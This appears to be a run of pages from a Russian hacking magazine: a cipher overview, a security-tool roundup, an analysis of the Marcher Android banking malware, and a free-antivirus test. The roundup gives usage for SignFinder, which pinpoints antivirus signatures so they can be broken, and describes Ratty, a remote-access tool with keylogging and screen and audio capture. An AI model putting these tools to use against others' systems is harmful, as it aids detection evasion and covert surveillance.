   Действительно, IDEA отличается высокой стойкостью благодаря своим
многочисленным математическим операциям. Кроме того, к достоинствам
данного алгоритма относится высокая скорость зашифрования — почти в два
раза выше, чем у алгоритма DES (в зависимости от платформы, на которой вы-
полняется шифрование). Однако скорость расшифровки снижается из-за тя-
желых операций вычисления, обратных умножению по модулю (216 + 1).
   Разумеется, и на этот сложный шифр мудрые криптографы пытались прове-
сти всевозможные атаки. Успеха достиг Пол Хокер, который реализовал атаку,
предполагая, что криптоаналитик не имеет прямого доступа к искомому ключу
(например, ключ прошит в каком-либо аппаратном шифраторе или смарт-кар-
те), но может изменять определенным образом различные фрагменты ключа.
   Алгоритм IDEA не стал международным стандартом шифрования, как того
желали его авторы. Однако его можно считать одним из наиболее распро-
страненных в мире алгоритмов шифрования. IDEA используется во множестве
приложений, в том числе в широко известном и распространенном протоколе
защиты данных PGP.

РЫБЫ БРЮСА ШНАЙЕРА
Брюс Шнайер — видная фигура криптографии наших дней. Он объездил полми-
ра с лекциями и семинарами, его книги настойчиво рекомендуют тем, кто стре-
мится знать криптографию. И конечно же, такой известный человек не хотел бы
слыть сапожником без сапог — он сам входит в группу крипторазработчиков.
  Мы вкратце познакомимся с одними из самых известных его детищ — алго-
ритмами шифрования Blowfish, Twofish и Threefish.

Blowfish
Первым на свет появился Blowfish. Как говорит сам Шнайер, этот алгоритм
был разработан для реализации на больших микропроцессорах. Поэтому он
компактен (всего 5 Кбайт памяти) и прост (использует простые математиче-
ские операции — сложение, XOR и выборку из таблицы). Также алгоритм по-
зволяет настраивать длину ключа (до 448 бит).
   На 32-битных процессорах Blowfish выполняет шифрование значительно
быстрее, нежели DES, однако на интеллектуальных платах в силу своей упро-
щенности он не особо применим. В основе Blowfish сеть Фейстеля из 16 раун-
дов, которую ты уже должен хорошо понимать.
   Алгоритм реализован в некоторых программных продуктах (FolderBolt,
Nautilus, PGPfone), однако сейчас он уже теряет свою актуальность.

Twofish
За первой рыбой появились еще две — новый алгоритм Twofish был разрабо-
тан Шнайером и компанией для участия в конкурсе AES. Работа Шнайера вы-
шла в пятерку финалистов, однако победителем так и не стала, хотя обладала
для этого всеми возможными плюсами. Это:
•  128-битный блочный симметричный шифр;
•  длина ключей: 128, 192 и 256 бит;
•  эффективная программная (в первую очередь на 32-битных процессорах)
   и аппаратная реализация;
•  гибкость (возможность использования ключа большей длины, примени-
   мость для поточного шифрования, хеш-функций и так далее);
•  простота алгоритма — его удобно анализировать.

Однако по сравнению с Rijndael, занявшим пьедестал AES, Twofish был более
сложным для анализа и обладал более низкой скоростью шифрования. Разра-
ботан этот алгоритм на основе Blowfish с некоторыми дополнениями и также
представляет собой сеть Фейстеля.
   На конкурсе шифр подвергли различным типам криптоанализа. По срав-
нению с остальными финалистами конкурса AESон оказался самым стойким.
Однако его необычное строение и относительная сложность породили неко-
торые сомнения в качестве этой прочности. На данный момент Twofish исполь-
зуется еще реже, чем его предшественник.

Threefish
«В третий раз закинул старик в море невод...» и десять лет спустя получился
шифр Threefish. На этот раз Шнайер решил переплюнуть AES и учел все не-
достатки предыдущего опыта. Криптограф не стал брать за основу сеть Фей-
стеля, а реализовал шифр на основе подстановочно-перестановочной сети
(SP-сети), как в AES. Такая сеть основана на комбинации операций исключа-
ющего ИЛИ, сложения и циклического сдвига. В упрощенном виде все это вы-
глядит так:





За счет простых операций Threefish значительно опережает в скорости AES.
Кроме того, по заявлениям авторов, алгоритм имеет более высокий уровень
безопасности, чем AES. Существует атака на 25 из 72 раундов Threefish, в то
время как для AES — на 6 из 10. Так что Брюс Шнайер добился-таки своей по-
беды, хоть и с опозданием.
  Шифр послужил основой для создания хеш-функции Skein, которая уча-
ствовала в конкурсе на должность SHA-3. Сам Threefish широко используется
и реализован в библиотеках для многих языков программирования.

ВЫВОДЫ
В заключение стоит сказать, что все западные криптографы, конечно, молод-
цы, разработали вагон и маленькую тележку различных алгоритмов шифрова-
ния. Какой-то более стойкий, какой-то более быстрый. Но пока все будут срав-
нивать их с DES и AES, потому что это классика.
  В следующей статье познакомимся с электронными подписями, очень
классным и важным средством криптографии.
Взлом





                                Дмитрий «D1g1» Евдокимов,
                                                               Digital Security
                                               @evdokimovds





СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ





                         WARNING

                                    Внимание! Информация
                                          представлена
                                     исключительно с целью
                                    ознакомления! Ни авторы,
                                     ни редакция за твои
                                    действия ответственности
                                           не несут!





                  SIGNFINDER
                      Написанный на Python скрипт поможет в нелегком
                      деле поиска сигнатур антивирусов в PE32-файлах.
                    На данный момент утилита имеет пять режимов ска-
                        нирования, позволяющих шаг за шагом детализи-
                        ровать места расположения сигнатур.
                         Поиск начинается с быстрого режима, уточняю-
                        щего, какой вид сигнатур нам встретился:
                         •  скан-строка в конкретной секции;
                         •  сигнатура эмулятора;
Авторы:                  •  сигнатура на импортируемых WinAPI
Auth0r                         •  или (методом исключения) на оставшихся заго-
                           ловках PE32.
URL:
github.com/coruws/                        python SF.py fast path_to_exe
SignFinder
                      После поверхностного осмотра принимается реше-
Система:               ние просканировать заголовки:
Windows
                        python SF.py head path_to_exe

                       или найти сигнатуру в конкретной секции:

                        python SF.py sect path_to_exe section_number

                     Для финальной стадии поиска подходит ручной ре-
                       жим, по очереди затирающий отрезки заданного
                           участка:

                        python SF.py man path_to_exe offset size
                            part_num

                      Таким нехитрым образом можно найти участок раз-
                    мером в пару байтов, гарантированно ломающий
                          сигнатуру.
                           Утилита обновляется, обрастая новыми режима-
                    ми сканирования.




                PROTOCOL LEARNING
                AND STATEFUL FUZZING
                            Pulsar — это сетевой фаззер с возможностями ав-
                        томатического изучения протокола и моделирова-
                          ния. Инструмент позволяет моделировать прото-
                        кол с помощью методов машинного обучения, таких
                          как кластеризация и скрытые марковские модели.
                      Эти модели могут быть использованы для модели-
                       рования связи между Pulsar и реальным клиентом
                       или сервером благодаря семантически правильноАвторы:
                      построенным сообщениям, которые, в сочетанииHugo Gascon
                       с серией Fuzzing-примитивов, позволяют проверить
                      реализацию неизвестного протокола на ошибкиURL:
                        в более глубоких фазах машины состояния своегоgithub.com/hgascon/pulsar
                         протокола.
                          Работа с инструментом заключается в двух этапах.Система:
                             1. Обучение. Например, на основе PCAP-файла:Linux

                        $> pulsar.py -l -p file.pcap (1 pcap file)
                        $> pulsar.py -b 016169EBEBF1CEC2AAD6C7F0D0EE9026
                            (1 or more binaries from cuckoo storage)
                        $> pulsar.py -a (all binaries from
                            cuckoo storage)

                             2. Использование полученной модели. Например,
                          для моделирования:

                        $> pulsar.py -s -m model_file

                     Или для фаззинга:

                        $> pulsar.py -z -m model_file

                      Более подробно с инструментом и его подходами
                    можно ознакомится в работе Pulsar: Stateful Black-
                      Box Fuzzing of Proprietary Network Protocols (pdf).





                  TLS-ATTACKER
                          TLS-Attacker — это фреймворк на языке програм-
                      мирования Java для анализа TLS-библиотек. Он
                      способен  отправлять произвольные сообщения
                       протокола в произвольном порядке в TLS-общении
                      и определять их модификацию, используя предо-
                       ставленный интерфейс. Это дает разработчику воз-
                      можность достаточно просто определить собствен-
                     ный поток TLS-протокола и проверить это против
                       собственной TLS-библиотеки.Авторы:
                         Проект состоит из пяти подпроектов:Ruhr University Bochum
                         •  Transport. Транспортные утилиты для TCP и UDP;
                         •  ModifiableVariable. Содержит изменяемые пере-URL:
                         менные, которые позволяют выполнять конкрет-github.com/RUB-NDS/TLS-
                           ные, а также случайные модификации перемен-Attacker
                         ных во время потока протокола. Изменяемые
                        переменные используются в сообщениях прото-Система:
                             кола;Windows/Linux
                         •  TLS. Реализация протокола, на данный момент
                         совместимого с (D)TLS 1.2;
                         •  Attacks. Реализация нескольких хорошо извест-
                         ных атак (Bleichenbacher, Dtls Padding Oracle,
                            EarlyCCS,  Heartbleed,  Invalid  Curve,  Padding
                              Oracle, Poodle, Winshock) и тестов для этих атак;
                         •  Fuzzer. Фаззинг-фреймворк, реализованный по-
                           верх функциональности TLS-Attacker.

                    На текущий момент есть поддержка следующих
                        стандартов и алгоритмов:
                         •  TLS versions 1.0 (RFC-2246), 1.1 (RFC-4346) и 1.2
                           (RFC-5246);
                         •  DTLS 1.2 (RFC-6347);
                         •  алгоритмы обмена (EC)DH и RSA key;
                         •  AES CBC;
                         •  расширения: EC, EC point format, Heartbeat, Max
                            fragment length, Server name, Signature и Hash
                                algorithms;
                         •  TLS-клиент (сервер скоро обещают).




                 FEATHERDUSTER
                          FeatherDuster — инструмент на Python для взло-
                    ма криптографии, который пытается сделать вы-
                       явление  и  эксплуатацию  слабых  криптосистем
                          как можно проще. Библиотека Cryptanalib, его не-
                       зависимая часть, может использоваться отдельно
                         от FeatherDuster, что дает возможность применять
                      ее в собственных Python-проектах.
                          Запуск программы очень прост:
Авторы:                        # python featherduster.py [ciphertext file 1]Daniel «unicornfurnace»
                            ... [ciphertext file n]Crowley
                          FeatherDuster имеет возможность автоматически
URL:                        распознавать и декодировать общие кодировки.
github.com/nccgroup/                    При подаче на вход одного файла программа будет
featherduster                       рассматривать каждую строку как потенциально за-
                     шифрованную или закодированную.
Система:                      На текущий момент Cryptanalib может обнару-
Linux / OS Х                       жить и декодировать следующие схемы:
                         •  Vanilla Base64;
                         •  ASCII hex-encoding;
                         •  Zlib compression.

                      Анализирующий движок Cryptanalib может выявить
                     следующие свойства на стадии анализа:
                         •  шифротекст с низкой энтропией (полезно для де-
                           тектирования кастомных алгоритмов шифрова-
                               ния);
                         •  блочный или потоковый алгоритм шифрования;
                         •  ECB-режим;
                         •  CBC-режим с фиксированным IV;
                         •  хеширующий алгоритм;
                         •  шифротекст OpenSSL;
                         •  переиспользование ключа в потоковом алгоритме;
                         •  RSA-ключи;
                         •  большие RSA-модули;
                         •  переиспользование RSA-модулей;
                         •  шифротекст с транспозицией.

                     Подробнее  об  инструменте  можно  узнать  из
                       слайдов Cleaning up Magical Crypto Fairy Dust with
                            Cryptanalib and FeatherDuster (pdf).




                MANALYZE
                     Порой необходимо самостоятельно вручную про-
                       анализировать какой-нибудь PE-файл на наличие
                        в нем вредоносного кода. Да, есть антивирусы,
                      но они, как правило, закрытые, и расширить их нель-
                             зя, а порой этого очень хочется. Да и логика работы
                       некоторых не очень понятна. Тогда приходится ре-
                       ализовывать что-то свое, пускай не такое мощное,
                         зато точно покрывающее наши потребности. По та-
                       кому пути пошел и автор Manalyze.Авторы:                           Manalyze — это статический анализатор, напи-Ivan Kwiatkowski
                      санный на С++, для PE-файлов с возможностью
                      расширения с помощью плагинов. На текущий мо-URL:                      мент инструмент может детектировать:github.com/JusticeRage/
                         •  определение компилятора;Manalyze
                         •  обнаружение запакованных файлов;
                         •  применение сигнатур ClamAV;Система:                         •  поиск подозрительных строк;Windows/Linux
                         •  подозрительный      импорт      (например,
                           WriteProcessMemory + CreateRemoteThread);
                         •  обнаружение криптографических констант;
                         •  отправка хешей на VirusTotal;
                         •  проверка сигнатур (на Windows).
                       Примеры использования:

                        manalyze.exe program.exe
                        manalyze.exe -dresources -dexports
                            -x out/ program.exe
                        manalyze.exe --dump=imports,sections
                            --hashes program.exe
                        manalyze.exe -r malwares/
                            --plugins=peid,clamav --dump all

                     Подробнее об инструменте и о написании соб-
                        ственных плагинов для него можно узнать на сайте
                         проекта.




                 A JAVA R.A.T.
                            Ratty — это программа на языке программирования
                         Java для удаленного управления своей или не своей
                        системой. Программа состоит из клиентской и сер-
                      верной части. В итоге можно выполнять ряд команд
                       на удаленной системе. GUI-интерфейс отображает
                        такую информацию об удаленной системе, как:
                         •  имя системы;
                         •  местонахождение;
                         •  IP-адрес;Авторы:
                         •  версия операционной системы.Johannes Boczek

                      Это все позволит ориентироваться в случае множе-URL:
                         ства удаленно управляемых машин. Но посмотрим,github.com/Sogomn/Ratty
                         что именно мы можем делать с помощью данной
                     программы на этих системах. Что касается функци-Система:
                        ональности, то можно:Windows/Linux/Mac
                         •  получить снимок экрана;
                         •  получить видеопоток удаленной системы;
                         •  получить аудиопоток удаленной системы;
                         •  получить буфер обмена;
                         •  записать нажатия клавиш;
                         •  скачать и запустить файл.

                      Ну и так как программа на Java, то это все отлично
                        работает сразу на нескольких операционных систе-
                          мах: Windows, Linux, OS Х. Благодаря наличию ис-
                        ходного кода можно добавлять и собственную функ-
                        циональность.




                  UNOFFICIAL IDE FOR NMAP SCRIPT (NSE)
                DEVELOPMENT
                         Halcyon — это среда разработки, сфокусирован-
                       ная на скриптах для легендарного сетевого сканера
                     Nmap. Для тех, кто не в курсе: для Nmap можно соз-
                        давать так называемые NSE-скрипты и расширять
                        его функциональность. Данная среда разработки
                       написана на Java и имеет в своем составе:
                         •  навигацию по коду;
                         •  подсветку синтаксиса;Авторы:
                         •  builder;Sanoop Thomas
                         •  автодополнение;
                         •  отладку.URL:
halcyon-ide.org
                   В общем, все, что только необходимо серьезной IDE.
                           Halcyon понимает Nmap-библиотеки так же хо-Система:
                      рошо, как и Lua-синтаксис. Из мелких полезностейWindows/Linux
                         есть поддержка шаблонов и часто используемых
                      фрагментов кода, как web-crawling,  bruteforcing,
                         что упрощает и ускоряет разработку собственных
                         скриптов.
                        Впервые инструмент был представлен на конфе-
                      ренции Black Hat Asia 2016.
MALWAR





                   ПРОСЛЕЖИВАЕМ ВЕСЬMARCHER:
                    ЦИКЛ ХАКЕРСКОЙ АТАКИ
                     НА ПОЛЬЗОВАТЕЛЕЙ
                      Е-БАНКИНГАПОЛНАЯ
АНАТОМИЯ
УГРОЗЫ





                                                                                Виктория Носова,
                                                                                                       консультант
                                                                                         по безопасности
                                                                                         Check Point Software
                                                                                                           Technologies




Антивирусным компаниям не так часто удается просле-
дить весь цикл хакерской атаки. Как правило, они могут
проанализировать сам вредоносный код и в некоторых
случаях определить источник заражения. Но на этот раз
нам сопутствовала удача: мы смогли отследить всю исто-
рию активности печально известного Marcher — вредо-
носного ПО для мобильных банков.

MARCHER: ПЕРВЫЕ ШАГИ
Впервые Marcher появился в 2013 году и атаковал преимущественно рос-
сийских пользователей. Первыми жертвами стали пользователи Google Play:
зловред крал информацию о кредитных картах, предлагая ввести данные че-
рез поддельные страницы банков. Но к марту 2014 года программа эволюци-
онировала, добавила в свой арсенал кражу учетных данных банков и теперь
атаковала пользователей в Германии. Недавно Marcher вновь обнаружился
с новой кампанией, распространяющейся через порносайты. Зловред прода-
ется на закрытых форумах по модели «вредоносный код как услуга», аналогич-
но программам для ПК.





                      Рис. 1. Версии ОС, ставшие жертвами Marcher

Жертвами Marcher становились пользователи всех официальных версий
Android, включая Marshmallow.

ПРОНИКНОВЕНИЕ: ФЛЕШ-ФИШИНГ
Фишинг до сих пор остается прекрасным способом заставить людей запустить
заражение. На рис. 2 показан пример письма, отправленного одному из со-
трудников Check Point.





                Рис. 2. Пример письма, отправленного одному из сотрудников Check Point

Злоумышленник подделал имя отправителя, но оставил очень подозрительный
адрес, который точно не будет использовать сотрудник Adobe. И совершенно
ясно, что фишинг направлен против пользователей Android.
   Если кликнуть на ссылку, начнется трехступенчатый процесс, который об-
манным путем заставит пользователя запустить инсталляцию из неизвестных
источников (вне Google Play) и затем загрузить вредоносное приложение.





                      Рис. 3. Первый этап установки вредоносного приложения: загрузка





                   Рис. 4. Второй этап установки вредоносного приложения: инсталляция

Как только приложение загружается, оно запрашивает расширенные полно-
мочия для выполнения своей вредоносной задачи.

НА УСТРОЙСТВЕ: ЧТО СОБОЙ ПРЕДСТАВЛЯЕТ MARCHER
Marcher — это относительно простой банковский зловред, однако новая вер-
сия способна обходить двухфакторную аутентификацию, крадя СМС, отправ-
ленные на устройство. Так же как и в случае с заражением, зловред просто
убеждает пользователя дать ему дополнительные права.
   Сначала вредоносная программа ворует список всех приложений, уста-
новленных на устройстве, и отправляет его на командный сервер, чтобы про-
верить, есть ли среди них уязвимые для заражения. Как только пользователь
запустит подходящее банковское приложение, зловред использует графиче-
скую накладку на страницу входа для кражи учетных данных.
   Приложения, выбранные в качестве целей в этой кампании, все австралий-
ские:
•  Westpac;
•  Bank West;
•  Commonwealth Bank of Australia;
•  George Bank;
•  ING Direct Australia;
•  Bank of South Australia;
• NAB — National Australia Bank.

Многие похожие зловреды выбирали в качестве целей банки различных стран,
но Marcher идет дальше всех и обманным путем, подделывая уведомления
от приложения, заставляет пользователей заходить в их аккаунты. Как только
владельцы телефонов вводят свои логины и пароли, они сразу оказываются
скомпрометированы.

ЗАВЕРШЕНИЕ ВРЕДОНОСНОЙ МИССИИ: ПЕРЕДАЧА ДАННЫХ
КОМАНДНОМУ СЕРВЕРУ
Эта часть кампании редко попадает в поле зрения внешнего мира. В этот же
раз исследователям удалось посмотреть на репозиторий командного сервера
и узнать, что там прячут хакеры. Там обнаружились данные, собранные с зара-
женных устройств:
•  Установленные на устройстве APK-файлы
   Таблица содержит более 13 тысяч приложений, пример на рис. 5.





                                                                   Рис. 5. APK-файлы

•  Поддельные уведомления от банковских приложений
Marcher обманным путем заставляет пользователей входить в их аккаунты, по-
казывая им уведомления о том, что на их счет поступило 7900 долларов (рис. 6).





                           Рис. 6. Поддельное уведомление о зачислении 7900 долларов


•  Таблицы с данными жертв, включая их IMEI, название устройства, версию
ОС, номер телефона, расположение, страну и многое другое
Список содержит около тысячи жертв, пример на рис. 7.





                                                                Рис. 7. Данные жертв


•  Детализированная информация о 540 кредитных картах, включая имя, но-
мер, дату истечения срока действия и CVC (рис. 8)





                                                       Рис. 8. Данные кредитных карт


•  Украденные учетные данные 300 жертв для разных приложений (PayPal,
Gmail), закодированные в Base64 (рис. 9)





                                                 Рис. 9. Данные жертв по приложениям


•  Таблицы СМС — украденные СМС с полными текстами сообщений. Злоу-
мышленники должны украсть все СМС, чтобы успешно обойти двухфакторную
аутентификацию (рис. 10)





                                                             Рис. 10. Украденные СМС

 Примеры украденных СМС — на рис. 11.





                                                    Рис. 11. Примеры украденных СМС


• И наконец, какая ирония! «G Data Android Security Plus по-прежнему активен.
Ваше Android-устройство защищено от вирусов» (рис. 12)





                                 Рис. 12. «G Data Android Security Plus по-прежнему ак-
                                  тивен. Ваше Android-устройство защищено от вирусов»

•  Учетные данные администратора (рис. 13)





                                              Рис. 13. Учетные данные администратора


НАСКОЛЬКО РАСПРОСТРАНЕНЫ ПОДОБНЫЕ ВРЕДОНОСНЫЕ
КАМПАНИИ?
На самом деле мобильные устройства не так уж сильно уступают обычным
компьютерам и ноутбукам в распространении и изощренности вредоносных
кампаний. Последние три года мы фиксируем достаточно опасные и успеш-
ные вредоносные кампании, нацеленные в основном на Android-устройства,
но есть и такие, которые обходят защиту даже неперепрошитых iOS-устройств
(вирусы Wirelurker и YiSpecter). Уже сейчас существует большое количество ви-
дов вредоносного ПО для смартфонов и планшетов, разнообразных методов
проникновения в систему и маскировки под легальное ПО и компоненты ОС.
   Как правило, злоумышленник, запускающий малварь, хочет получить фи-
нансовую прибыль, и чем скорее, тем лучше. Поэтому чаще всего троян за-
ставляет пользователя либо подписаться на платную СМС-рассылку, либо
ввести данные своей кредитной карты в поддельное приложение, которое за-
гружается во время кампании. Из последних известны следующие вредонос-
ные кампании:
•  рассылка фальшивых купонов через WhatsApp-мессенджер, в результа-
   те успешной атаки устройство подписывается на платную СМС-рассылку
   без ведома пользователя;
•  «телефонный помощник», который, помимо полезной активности, имитиру-
   ет входящие сообщения электронной почты и СМС. Нажимая на такое опо-
   вещение, ничего не подозревающий пользователь запускает троян, кото-
   рый собирает данные с устройства и отправляет их в командный центр.

Стали популярны программы-вымогатели и для мобильных устройств, шифру-
ющие содержимое устройства и требующие выкуп за расшифровку.

КАК ЗАЩИТИТЬ СВОИ ДАННЫЕ ОТ ПОДОБНОГО ВРЕДОНОСНОГО ПО
К обязательным методам защиты относятся следующие: антивирусное ПО,
блокирующее вредоносную активность и подозрительные программы; систе-
ма контроля доступа к интернет-ресурсам, оповещающая о попытках доступа
к нежелательным или зараженным сайтам или блокирующая их. Это тот мини-
мум, который должен быть на каждом мобильном устройстве. Если доступны
более широкие возможности, то настоятельно рекомендуем ими воспользо-
ваться: это усилит уровень защиты твоих данных и денежных средств.
  Но мало установить защитное ПО, имеющее актуальные базы данных вре-
доносов, — нужно еще и быть внимательным с запуском приложений, даже
если они на первый взгляд очень полезны или занимательны для тебя. Обра-
ти внимание на то, какие права доступа требует установка выбранного прило-
жения. Калькулятор, запрашивающий доступ к данным о местоположении или
к хранилищу фотографий, должен вызвать сомнение, целесообразно ли его
устанавливать. Будь аккуратен перед тем, как подтверждать что-либо через
СМС. Открывая страницу любого сайта, обязательно сверь все данные, ука-
занные в запросе или в названии и описании сайта. Самый испытанный спо-
соб при введении учетных данных в соцсети или в интернет-банке — снача-
ла вводить неверные данные. Поддельное ПО или сайт не выдаст ошибки, так
как не знает, какие данные правильные :). Это и должно смутить.
   Если говорить про обычных пользователей, то, к сожалению, защитой мо-
бильных устройств никто не озадачивается всерьез. Все эти новости о краже
логинов и паролей с Android-устройств даже у россиян нисколько не сдвигают
дело с мертвой точки. Человек задумается только тогда, когда у него самого
или очень близкого человека случится нечто подобное.
  С сотрудниками компаний проще: многие организации уже озаботились
защитой мобильных устройств, поскольку, как правило, с них разрешен уда-
ленный доступ к критичным системам и ресурсам. И им приходится устанав-
ливать ПО защиты и выполнять те меры предосторожности, которых требует
компания.
MALWARE
ТЕСТ БЕСПЛАТНЫХ
                      ЧАСТЬ 3АНТИВИРУСОВ
                               ПРОВЕРЯЕМ БОЕМ
                               CLAM SENTINEL,
                                       FORTICLIENT,
                                 TENCENT
       84ckf1r3
   84ckf1r3@gmail.com                      И NANO
                                АНТИВИРУС





Бесплатные антивирусы есть в арсенале многих софтвер-
ных компаний. Они выпускаются как реклама платных
версий с дополнительными функциями и применяются
для сбора статистики (ну и заодно снижают общее коли-
чество зараженных компьютеров в мире). Подходы у всех
разработчиков разные, и среди них встречаются инте-
ресные решения. На этот раз мы проверим ClamWin Free
Antivirus с модулем Clam Sentinel, FortiClient for Windows,
NANO Антивирус и Tencent PC Manager.

МЕТОДИКА ТЕСТИРОВАНИЯ
Как и в предыдущий раз, мы настроили виртуальную машину с чистой Windows
10 Pro (32-битная версия 1511, сборка 10586.164) и клонировали ее четы-
режды. Согласно минимальным системным требованиям, для инсталляции
32-битной версии Windows 10 нужно от 16 Гбайт свободно-
го места. Мы выделили каждой виртуальной машине свой
диск размером 25 Гбайт, чтобы гарантированно хватило
на установку одного антивируса, пакетов обновлений, хра-
нение временных файлов и размножение зловредов, если
они все же прорвут первую линию обороны. Для чистоты
эксперимента «Защитник Windows» и фильтр SmartScreen        INFO
предварительно были отключены, а контроль учетных за-                                                                             Браузер Edge
писей оставался активным.                                                                              содержит
  В каждой виртуалке был установлен свой антивирус.      интегрированный
После обновления их работу проверили по общему спи-       компонент Flash
                                                                                         Player (от которого
ску из десяти свежих угроз базы Clean MX. Она содержит                                                                                        Microsoft планирует
адреса потенциально опасных, зараженных и фишинговых      вскоре отказаться,
веб-страниц, а также сайтов, на которых предлагается ска-      оставив его только
                                                                               в Internet Explorer),чать протрояненные файлы под видом различных утилит.                                                                          но не поддерживает
Мы отобрали угрозы разного типа и предварительно про-      дополнительные
верили их как через онлайн-сканер VirusTotal, так и в ис-      модули. Поэтому
                                                                                 Java-код в Windowsходном клоне Windows 10 Pro без антивируса. После этого
                                                                         10 выполняется
каждый URL открывался в браузере Edge. Результат каж-                                                                            средствами JRE
дого срабатывания антивируса протоколировался, равно        через IE v. 11.
как и его отсутствие.

CLAMWIN FREE ANTIVIRUS V. 0.99.1 + CLAM SENTINEL V. 1.22
Бесплатный австралийский антивирус ClamWin работает в среде Windows
98 — Windows 10 и распространяется с открытыми исходными кодами под ли-
цензией GNU GPL. Изначально он представляет собой только сканер по за-
просу и не имеет модуля защиты в реальном времени. Добавить его можно
с помощью другой бесплатной программы — Clam Sentinel, написанной ита-
льянским сторонником СПО Андреа Руссо (Andrea Russo).





                                                   Контекстное меню Clam Sentinel

Установка обоих компонентов проходит быстро (меньше минуты). Есть воз-
можность интеграции ClamWin в проводник Windows и почтовый клиент MS
Outlook. На момент теста антивирусная база ClamWin содержала более 4,2
миллиона сигнатур. Вместе с базами антивирус и модуль постоянной защиты
занимают на диске 120 Мбайт.





                                            Настройка проверяемых типов файлов

Сразу после установки Clam Sentinel предлагает вы-
брать контролируемые диски. В его меню выполне-
на качественная локализация на русский, а все пара-
метры имеют «говорящие» названия. Вручную можно
задать массу дополнительных настроек, но мы не со-
ветуем включать обнаружение подозрительных изме-                                               WARNING
нений в системе. Windows 10 постоянно обновляется
и тасует системные файлы в целях оптимизации, по-     Все тесты выполнялись
                                                                             только в исследователь-этому в параноидальном режиме Clam Sentinel будет                                                                              ских целях. Необходи-
давать ложные срабатывания постоянно — буквально    мые файлы были загру-
каждую секунду.                                               жены с общедоступных
                                                                            ресурсов. Разработчики  В первом тесте при попытке перейти на зараженную
                                                                           протестированных
веб-страницу Clam Sentinel успешно обнаружил в джа-                                                                           антивирусов получили
ва-скрипте неизвестный ему троян с помощью эври-      автоматические уве-
стического анализа и поместил его в карантин, удалив     домления о результатах
                                                                           сканирования. Редакцияиз кеша браузера. Однако во втором тесте он не опре-                                                                     и автор не несут ответ-
делил другую угрозу (Trojan-Downloader) ни по сигнатур-      ственности за любой
ному, ни по эвристическому анализу. Вредоносный код       возможный вред.
смог запуститься и произвести изменения в системе.





                                                   Clam Sentinel пропустил троян

То же самое произошло в третьем и четвертом тесте. ClamWin проигнориро-
вал загрузку зараженной страницы и загрузку трояна даже при сканировании
содержащего его файла вручную.
  На попытку скачать и запустить заведомо зараженный исполняемый файл
(.exe) Clam Sentinel среагировал сразу после окончания его загрузки. Он
успешно определил Trojan.Hupigon и переместил его в карантин.





                                                  ClamWin удаляет троян Hupigon

Шестой и седьмой тесты были нужны для оценки защиты от посещения фи-
шинговых сайтов. ClamWin + Clam Sentinel провалили их, никак не воспрепят-
ствовав загрузке поддельных страниц Amazon и AOL.





                                            Clam Sentinel не защищает от фишинга

В тесте с зараженным файлом для мобильной платформы J2ME поведение
ClamWin приятно удивило. Антивирус среагировал быстро: инфицированный
JAR-файл был моментально вычищен из каталога загрузок. Аналогично получи-
лось и при попытке скачать зараженный файл типа JAR в архиве ZIP. Он был пе-
ремещен в карантин еще до того, как я попытался открыть его из окна браузера.





                                      ClamWin устраняет инфицированные объекты

Однако вредоносное приложение для ОС Android ClamWin пропустил как в ав-
томатическом, так и в ручном режиме сканирования. Троянец, рассылающий
СМС на короткие номера под видом игры «Говорящий Том», остался им не за-
мечен. Общий результат: 4 из 10 тестов пройдены успешно.

FORTICLIENT
FortiClient — это канадский агент подключения к VPN с бесплатным антиви-
русом, веб-фильтром и анализатором уязвимостей. Работает в ОС Windows
от XP до 10 и может использоваться независимо от типа подключения к интер-
нету (с или без VPN).
   Установка FortiClient происходит относительно долго (больше пяти минут)
и в несколько этапов, причем их название не соответствует действительности.
Когда на экране отображается сообщение «распаковка загруженных обра-
зов», судя по логу TCPView, в это время все еще идет их загрузка. Сразу после
этого выполняется быстрая проверка системы, а затем установка продолжает-
ся автоматически.





                                                         Интерфейс FortiClient

Интерфейс FortiClient — англо-русский. Трудно угадать, на каком языке будет
следующее сообщение антивируса или даже строка его настроек. Частичная
локализация FortiClient словно выполнена сервисом Google Translate. Надписи
«Вирус Очиститель» и «Потенциально опасное для безопасности» еще долго
будут сниться мне в кошмарах.





                                       FortiClient блокирует загрузку зараженных веб-страниц

Первые четыре теста FortiClient прошел успешно. Сообщения о заблокирован-
ных угрозах появлялись прямо в окне браузера, вместо содержимого инфи-
цированных веб-страниц. Так же произошло и во всех тестах с шестого по де-
сятый, однако пятый тест FortiClient провалил. Модификация трояна Hupigon
запустилась, показала отвлекающий маневр во весь экран и установила в си-
стеме бэкдор. FortiClient даже не шелохнулся. Это была единственная его осеч-
ка за всю серию экспериментов, но очень серьезная по своим последствиям.





                                                         Троян Hupigon проскочил


Во всех остальных случаях он блокировал любые типы угроз, включая попытки
загрузить вредоносные файлы типов EXE, JS, JAR, ZIP или перейти на фишин-
говые сайты. Однако понять, что именно поймал антивирус, было сложно. Все
сообщения выглядели одинаково в пределах своей категории: фишинг либо
вредоносное ПО.





                                                                        Forti Client набирает 9/10

Общий результат: 9 из 10 тестов пройдены успешно; защита от фишинга ра-
ботает.

                           Продолжение статьи
MALWARE
ТЕСТНачало статьи БЕСПЛАТНЫХ
                      ЧАСТЬ 3АНТИВИРУСОВ
ПРОВЕРЯЕМ БОЕМ CLAM SENTINEL,
FORTICLIENT, TENCENT И NANO АНТИВИРУС



NANO АНТИВИРУС
На неуместное употребление маркетологами десятичной приставки «нано»
у меня давно выработалась аллергическая реакция. Глаза слезятся, лицо ба-
гровеет, а руки чешутся взять топор. Наука ведь требует жертв, верно? Впро-
чем, хорошо, если название будет единственным недостатком нового отече-
ственного продукта.
   Российский антивирус для Windows (XP SP3 — 10) от ООО «НАНО Секью-
рити» во время установки требует регистрации даже при активации бесплат-
ной лицензии (хинт: введенные данные не проверяются).
   Срок действия цифрового сертификата, выданного NANO Security Ltd,
на момент теста истек, однако это не помешало установке последней версии
NANO Антивируса.





                                                 Сертификат издателя просрочен

Онлайн-инсталлятор загрузил 434 Мбайт, а для их распаковки потребовал
2 Гбайт на диске. Такие требования отчасти объясняются предложением уста-
новить до кучи Яндекс.Браузер и другой сопутствующий софт. После установ-
ки происходит автоматическое обновление, и мы видим долгожданную ре-
кламу с предложением попробовать версию Pro. Если ты случайно закрыл это
окошко — не переживай! Оно еще не раз всплывет.
   После ожидаемо скорбного начала мое мнение об этом антивирусе стало
меняться в лучшую сторону. У него оказался очень наглядный и строгий интер-
фейс. Настолько информативные вкладки попадаются редко. Текущее состоя-
ние и все настройки в них отображаются как на ладони.





                                                  Интерфейс NANO Антивируса


